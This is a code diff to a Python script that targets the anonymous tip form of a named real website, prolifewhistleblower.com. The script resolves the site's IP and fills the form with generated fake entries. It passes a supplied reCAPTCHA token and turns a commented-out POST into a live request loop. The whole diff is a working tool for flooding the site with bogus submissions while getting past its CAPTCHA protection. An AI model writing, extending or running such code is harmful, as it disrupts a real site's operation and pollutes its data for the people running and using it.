@@ -1,7 +1,9 @@
 import requests
 import dns.resolver
+import data
 
 target_ip = dns.resolver.resolve('prolifewhistleblower.com', 'A').response.answer[0].to_text()[len('prolifewhistleblower.com. 0 IN A '):]
+anonymous_form_data = data.anonymous_form()
 
 def anonymous_form(token):
 	headers = {
@@ -23,7 +25,7 @@ def anonymous_form(token):
 		'text-5': 'County',
 		'checkbox-1[]': 'no',
 		'g-recaptcha-response': token,
-		'hidden-1': '98.218.129.19',
+		'hidden-1': 'IP address',
 		'referer_url': 'https://prolifewhistleblower.com/anonymous-form/',
 		'forminator_nonce': 'dde67b9a73',
 		'_wp_http_referer': '/anonymous-form/',
@@ -36,8 +38,16 @@ def anonymous_form(token):
 		'input_11': ''
 	}
 
+	generated_data = next(anonymous_form_data)
+	for key in generated_data:
+		data[key] = generated_data[key]
+
 	print(data)
-	# response = requests.post('https://{}/anonymous-form'.format(target_ip), headers=headers, data=data)
+	try:
+		requests.post('https://{}/anonymous-form'.format(target_ip), headers=headers, data=data)
+	except Exception as e:
+		print('Had an issue.')
+		print(e)
 
 def sign_up_page(token):
 	headers = {
